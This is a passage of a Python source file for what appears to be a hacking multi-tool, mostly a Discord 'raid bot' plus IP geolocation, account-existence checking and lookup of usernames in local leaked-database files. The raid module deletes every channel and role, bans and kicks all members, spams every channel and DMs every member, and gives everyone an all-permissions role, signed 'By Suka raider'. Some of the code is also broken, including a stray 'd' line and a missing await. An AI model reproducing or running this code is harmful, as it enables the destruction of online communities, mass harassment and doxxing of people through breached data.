        r = requests.get(link)
        rp = r.json()
        rs = rp.get('result')
        url = rp.get('url')
        if rs == 'available':
            print(f'{Y}[!] {url} | Account do not exists.')
        elif rs == 'taken':
            print(f'{G}[+] {url} | Account exists.')
        else:
            print(f'{R}[X] {url} | Unknown.')
    input(f'{main_color()}[@] Press enter to continue...')
    main()

# Ip Informations 
def ip_lookup():
    clear()
    banner_lookup()
    address = input(f'{main_color()}[?] Enter Ip to lookup: ')
    req = requests.get(f"http://ip-api.com/json/{address}")
    if req.status_code == 200:
        response = req.json()
        country = response.get('country')
        country_code = response.get('countryCode')
        region = response.get('region')
        region_name = response.get('regionName')
        city = response.get('city')
        zip_code = response.get('zip')
        latitude = response.get('lat')
        longitude = response.get('lon')
        isp = response.get('isp')
        operator = response.get('as')
        print(' ')
        print(f'{main_color()}[+] Ip Addess: {W}{address}')
        print(f'{main_color()}[+] Country: {W}{country}')
        print(f'{main_color()}[+] Country Code: {W}{country_code}')
        print(f'{main_color()}[+] Region: {W}{region_name}')
        print(f'{main_color()}[+] Region Code: {W}{region}')
        print(f'{main_color()}[+] City: {W}{city}')
        print(f'{main_color()}[+] Zip Code: {W}{zip_code}')
        print(f'{main_color()}[+] Latitude: {W}{latitude}')
        print(f'{main_color()}[+] Longitute: {W}{longitude}')
        print(f'{main_color()}[+] Isp: {W}{isp}')
        print(f'{main_color()}[+] Operator Corporation: {W}{operator}')
        print(' ')
        input(f'{main_color()}[@] Press Enter to continue...')
        main()
    else:
        print(f'{main_color()}[X] Invalid Ip Address.')
        time.sleep(4)
        main()

# Fivem Searcher
def fivem_searcher():
    clear()
    fivem_banner()
    search = sinput(f'Username To Search: ')
    all_files = os.listdir('databases/fivem')
    count = 0
    print(f'{W} ')
    for file in all_files:
        with open(f'databases/fivem/{file.title()}', 'r', encoding='utf-8') as f:
            for line in f.read().splitlines():
                data = line.strip()
                try:
                    json_data = json.loads(data)
                    if 'name' in json_data and search.lower() in json_data['name'].lower():
                        count += 1
                        print(data)
                except json.JSONDecodeError:
                    print(f"Invalid JSON in line: {data}")
    print(' ')
    if count == 0:
        input(f'{main_color()}[X] No information found in databases. Press enter to continue...')
    else:
        input(f'{main_color()}[@] {count} information(s) found. Press enter to continue...')
    main()
########################################################################################################################################
################################################## Utils Tools Choice Number 4 ########################################################
########################################################################################################################################


########################################################################################################################################
################################################## Tool Utils Choice Number 6 ##########################################################
########################################################################################################################################

def utils_tools():
    clear()

########################################################################################################################################
############################################## Discord Raid Bot Choice Number 5 ########################################################
########################################################################################################################################

# Bot Login and Onliner
def start_raid_bot():
    clear()
    token = input(f"{main_color()}[?] Enter Bot Token: ")
    guild_id = int(input('Enter Guild Id: '))
    bot = commands.Bot(command_prefix='+', intents = discord.Intents.all())
    @bot.event
    async def on_ready():
        guild = bot.get_guild(guild_id)
        if guild:
            print(f'{main_color()}[@] Guild with id {guild_id} found... Please Wait')
            await raid_bot(guild_id, bot)
        else:
            print(f'{R}[X] Guild with id {guild_id} not found. Returning to main...')
            await bot.close()
            main()
    bot.run(token)

# Choice Menu + Input
async def raid_bot(guild_id, bot):
    clear()
    raid_bot_banner()
    choice = sinput('Choice: ')
    if choice == "1":
        await create_mass_channel(guild_id, bot)
    elif choice == "2":
        await delete_all_channels(guild_id, bot)
    elif choice == "3":
        await spam_all_channels(guild_id, bot)
    elif choice == "4":
        await mass_create_role(guild_id, bot)
    elif choice == "5":
        await mass_role_delete(guild_id, bot)
    elif choice == "6":
        await ban_all(guild_id, bot)
    elif choice == "7":
        await autoraid(guild_id, bot)
    elif choice == "8":
        await kick_all(guild_id, bot)
    elif choice == "9":
        await dmall(guild_id, bot)
    elif choice == "10":
        await all_admin(guild_id, bot)
    elif choice == "z":
        await bot.close()
        main()

# Autoraid Function
async def autoraid(guild_id, bot):
    countdelete = 0
    errordelete = 0
    errorcreate = 0
    countcreate = 0
    countspam = 0
    errorspam = 0
    guild = bot.get_guild(guild_id)
    ctype = input(f'[?] Channels Type (text/voice): ')
    amount = int(input(f'[?] Number of channels: '))
    name = input(f"[?] Channel's Name: ")
    message = input(f'{main_color()}[?] Message Sent In channels: ')

    async def delete_channel(channel):
        nonlocal countdelete, errordelete
        try:
            await channel.delete()
            countdelete += 1
            print(f'{G}[+] Channel: {channel.name} Deleted. {countdelete}/{len(guild.channels)}')
        except Exception as e:
            errordelete += 1
            print(f'{G}[X] Cannot Delete {channel.name}. {e}')

    async def create_channel(name, ctype):
        nonlocal countcreate, errorcreate
        try:
            if ctype == "voice":
                cvoice = await guild.create_voice_channel(name=name)
                countcreate += 1
                print(f'{G}[+] Channel Created. ID: {cvoice.id}. {countcreate}/{amount}')
            else:
                ctext = await guild.create_text_channel(name=name)
                countcreate += 1
                print(f'{G}[+] Channel Created. ID: {ctext.id}. {countcreate}/{amount}')
        except Exception as e:
            print(f'{R}[X] Cannot Create Channel. {e}')
            errorcreate += 1

    async def spam_channel(channel, message, amount):
        nonlocal countspam, errorspam
        for _ in range(amount):
            try:
                await channel.send(message)
                countspam += 1
                print(f'{G}[+] Message sent in {channel.name}. {countspam} Message Sent')
            except Exception as e:
                errorspam += 1
                print(f'{R}[X] Cannot Send Message in {channel.name}. {e}')

    delete_tasks = [delete_channel(channel) for channel in guild.channels]
    await asyncio.gather(*delete_tasks)
    create_tasks = [create_channel(name=name, ctype=ctype) for _ in range(amount)]
    await asyncio.gather(*create_tasks)    
    spam_task = [spam_channel(channel, message, 100000) for channel in guild.channels if isinstance(channel, discord.TextChannel)]
    await asyncio.gather(*spam_task)
    print(f'{main_color()}[@] Autoraid Finished. {countspam + countcreate + countdelete} SUCCESS Operation / {errorcreate + errordelete + errorspam} ERROR operations')
    await asyncio.sleep(5)
    return await raid_bot(guild_id, bot)

# All Admin Member Function
async def all_admin(guild_id, bot):
    count = 0
    error = 0
    guild = bot.get_guild(guild_id)
    try:
        role = guild.create_role(permissions=discord.Permissions.all())
        for member in guild.members:
            try:
                await member.add_roles(role)
                count += 1
                print(f'{G}[+] Administrator added to {member.name}. {count}/{len(guild.members)}')
            except Exception as e:
                error += 1
                print(f'{main_color()}[X] Cannot add administrator to {member.name}. {e}')
        print(f'{main_color()}[@] Administrator Added To All Member. {count} SUCCESS / {error} ERROR')
    except Exception as e:
        print(f'{R}[X] Error With Admin Role Creation. {e}')

# Dm All Function
async def dmall(guild_id, bot):
    count = 0
    error = 0
    guild = bot.get_guild(guild_id)
    message = input(f'{main_color()}[?] Message: ')
    for member in guild.members:
        try:
            await member.send(message)
            count += 1
            print(f'{G}[+] Member {member.name} Message Sent Successfuly {count}/{len(guild.members)}')
        except Exception as e:
            error += 1
            print(f'{R}[X] Failed To Message {member.name}. {e}')

    print(f'{main_color()}[@] All Member Are Messaged. {count} SUCCESS / {error} ERROR')
    time.sleep(2)
    return await raid_bot(guild_id, bot)

# Ban All Function
async def ban_all(guild_id, bot):
    count = 0
    error = 0
    guild = bot.get_guild(guild_id)
    async def ban_member(member):
        nonlocal guild, count, error
        try:
            await member.ban(reason="By Suka raider")
            count += 1
            print(f'{G}[+] Member {member.name} Banned. {count}/{guild.member_count}')
        except Exception as e:
            error += 1
            print(f'{R}[X] Failed To Ban Member {member.name}. {e}')
    ban_task = [ban_member(member) for member in guild.members if isinstance(member, discord.Member)]
    await asyncio.gather(*ban_task)
    print(f'{main_color()}[@] Ban All Finished. {count} SUCCESS / {error} ERROR')
    time.sleep(2)
    return await raid_bot(guild_id, bot)

# Kikc all Function
async def kick_all(guild_id, bot):
    count = 0
    error = 0
    guild = bot.get_guild(guild_id)
    async def kick_member(member):
        nonlocal guild, count, error
        try:
            await member.kick(reason="By Suka raider")
            count += 1
            print(f'{G}[+] Member {member.name} Banned. {count}/{guild.member_count}')
        except Exception as e:
            error += 1
            print(f'{R}[X] Failed To Kick Member {member.name}. {e}')
    kick_task = [kick_member(member) for member in guild.members if isinstance(member, discord.Member)]
    await asyncio.gather(*kick_task)
    print(f'{main_color()}[@] Kick All Finished. {count} SUCCESS / {error} ERROR')
    time.sleep(2)
    return await raid_bot(guild_id, bot)

# Mass Role Delete Function
async def mass_role_delete(guild_id, bot):
    count = 0
    error = 0
    guild = bot.get_guild(guild_id)
    async def delete_role(role, amount):
        nonlocal count, error
        try:
            await role.delete()
            count += 1
            print(f'{G}[+] Role {role.name} Deleted. {count}/{amount}')
        except Exception as e:
            print(f'{R}[X] Error With Deleting Role {role.name}. {e }')
            error += 1
        
    role_task = [delete_role(role, len(guild.roles)) for role in guild.roles]
    await asyncio.gather(*role_task)
    print(f'{main_color()}[@] All Roles are deleted. {count} SUCCESS / {error} ERROR')
    time.sleep(2)
    return await raid_bot(guild_id, bot)

# Create Mass Channel Function
async def create_mass_channel(guild_id, bot):
    count = 0
    error = 0
    guild = bot.get_guild(int(guild_id))
    
    ctype = input(f'[?] Channels Type (text/voice): ')
    amount = int(input(f'[?] Number of channels: '))
    name = input(f"[?] Channel's Name: ")

    async def create_channel(name, ctype):
        nonlocal count, error
        try:
            if ctype == "voice":
                cvoice = await guild.create_voice_channel(name=name)
                count += 1
                print(f'{G}[+] Channel Created. ID: {cvoice.id}. {count}/{amount}')
            else:
                ctext = await guild.create_text_channel(name=name)
                count += 1
                print(f'{G}[+] Channel Created. ID: {ctext.id}. {count}/{amount}')
        except Exception as e:
            print(f'{R}[X] Cannot Create Channel. {e}')
            error += 1

    create_tasks = [create_channel(name=name, ctype=ctype) for _ in range(amount)]
    await asyncio.gather(*create_tasks)
    d
    print(f'{main_color()}[@] Mass Creating Channel Finished. {count} SUCCESS / {error} ERROR')
    await asyncio.sleep(2)
    return await raid_bot(guild_id, bot)
        
# Mass Delete Channel Function
async def delete_all_channels(guild_id, bot):
    count = 0
    error = 0
    guild = bot.get_guild(int(guild_id))

    async def delete_channel(channel):
        nonlocal count, error
        try:
            await channel.delete()
            count += 1
            print(f'{G}[+] Channel: {channel.name} Deleted. {count}/{len(guild.channels)}')
        except Exception as e:
            error += 1
            print(f'{G}[X] Cannot Delete {channel.name}. {e}')

    delete_tasks = [delete_channel(channel) for channel in guild.channels]
    await asyncio.gather(*delete_tasks)

    print(f'{main_color()}[@] Mass Delete Channel Finished. {count} SUCCESS / {error} ERROR')
    time.sleep(2)
    return await raid_bot(guild_id, bot)

# Channel Spammer Function
async def spam_all_channels(guild_id, bot):
    count = 0
    error = 0
    guild = bot.get_guild(guild_id) 
    amount = None
    amount = int(input(f'{main_color()}[?] Number of message you want in each channel ?: '))
    message = input(f'{main_color()}[?] Message: ')
    async def spam_channel(channel, message, amount):
        nonlocal count, error
        for _ in range(amount):
            try:
                await channel.send(message)
                count += 1
                print(f'{G}[+] Message sent in {channel.name}. {count}/{amount}')
            except Exception as e:
                count += 1
                error += 1
                print(f'{R}[X] Cannot Send Message in {channel.name}. {e}')

    spam_task = [spam_channel(channel, message, amount) for channel in guild.channels if isinstance(channel, discord.TextChannel)]
    await asyncio.gather(*spam_task)
    print(f'{main_color()}[@] Spam Finished. {count} SUCCESS / {error} ERROR')
    time.sleep(2)
    return await raid_bot(guild_id, bot)

# Mass Role Create Function
async def mass_create_role(guild_id, bot):
    error = 0
    count = 0
    guild = bot.get_guild(guild_id)
    amount = int(input(f'{main_color()}[?] Number of role you want create: '))
    name = input(f'{main_color()}[?] Role Name: ')
    
    async def create_role(amount, name):
        nonlocal error, count
        try:
            role = await guild.create_role(name=name)
            count += 1
            print(f'{G}[+] Role Created. ID: {role.name}. {count}/{amount}')
        except Exception as e:
            error += 1
            print(f'{R}[X] Error With Creating Role. {e}')

    role_task = [create_role(amount, name) for _ in range(amount)]
    await asyncio.gather(*role_task)
    print(f'{main_color()}[@] Mass Create Role Finished. {count} SUCCESS / {error} ERROR')
    time.sleep(2)
    return await raid_bot(guild_id, bot)

########################################################################################################################################
##################################################   Main Function   ###################################################################
########################################################################################################################################

def main():
    clear()
    main_banner()
    choice = sinput("Choice: ")
    if choice == "1":
        discord_tools_choice()
    if choice == "2":
        snusbase_api()
    elif choice == "3":
        osint()
    elif choice == "4":
        print('soon')
    elif choice == "5":
        start_raid_bot()
    elif choice == "6":
        credit_banner()
    else:
        return
    
if __name__ == "__main__":
    init_func()
    main()